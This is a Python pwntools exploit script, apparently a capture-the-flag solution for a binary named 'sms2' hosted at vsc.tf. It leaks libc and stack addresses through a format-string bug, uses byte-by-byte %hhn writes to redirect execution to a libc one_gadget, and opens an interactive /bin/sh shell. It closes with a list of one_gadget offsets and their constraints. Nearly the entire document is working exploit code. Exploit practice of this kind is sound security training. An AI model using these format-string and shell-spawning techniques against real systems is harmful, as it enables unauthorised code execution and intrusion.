#!/usr/bin/python3

from pwn import *

exe = ELF('sms2_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x1327 
        c
        ''')
        input()


if args.REMOTE:
    p = remote('vsc.tf', 7002)
else:
    p = process(exe.path)


def se(pa1, pa2):
    sla(b'Message: ', pa1)
    sla(b'Your name: ', pa2)


# se(b'wan', b'%8$p|%29$p|')
# p.recvuntil(b'farewells,\n')
# stack = int(p.recvuntil(b'|', drop=True), 16)
# libc.address = int(p.recvuntil(b'|', drop=True), 16)
# info("stack " + hex(stack))
# info("stack " + hex(libc.address))
pa = f'%{0xd8}c%8$hhn'
print(len(pa))
se(b'w'*8, pa)
se(b'w'*8, f'%{0x16}c%26$hhn')
se(b'w'*8, f'%{0x16}c%26$hhn')
se(b'w'*8, f'%29$p|%8$p|')
p.recvuntil(b'farewells,\n')
libc.address = int(p.recvuntil(b'|', drop=True), 16) - 0x29d90
stack = int(p.recvuntil(b'|', drop=True), 16)
info("stack " + hex(stack))
info("libc " + hex(libc.address))
se(b'w'*8, f'%{0x16}c%26$hhn')
one = libc.address + 0xebc81

# for i in range(6):
#     se(flat(stack+0x18+i), f"%{one & 0xff}c%12$hhn".encode())
#     se(flat(stack+0x18+i), f'%{0x16}c%26$hhn')
#     one = one >> 8

# fini = 0x3d90
res = stack-0x60 - 0x3d90
cnt = 0xe0
# se(flat(stack+0xd0+i), f"%{cnt & 0xff}c%12$hhn".encode())
for i in range(6):
    se(flat(stack+0xd0), f"%{cnt & 0xff}c%12$hhn".encode())
    se(flat(stack+0x18+i), f'%{0x16}c%26$hhn')
    se(flat(stack+0xd0+i), f"%{res & 0xff}c%52$hhn".encode())
    se(flat(stack+0xd0+i), f'%{0x16}c%26$hhn')
    cnt += 1
    res = res >> 8
se(flat(stack+0xd0), f'%{0xe0 & 0xff}c%12$hhn')
GDB()
se(flat(one, one, one, one, one), b'1')
p.interactive()
'''
0xebc81 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebc85 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebc88 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebce2 execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xebd38 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebd3f execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  rax == NULL || {rax, r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

'''
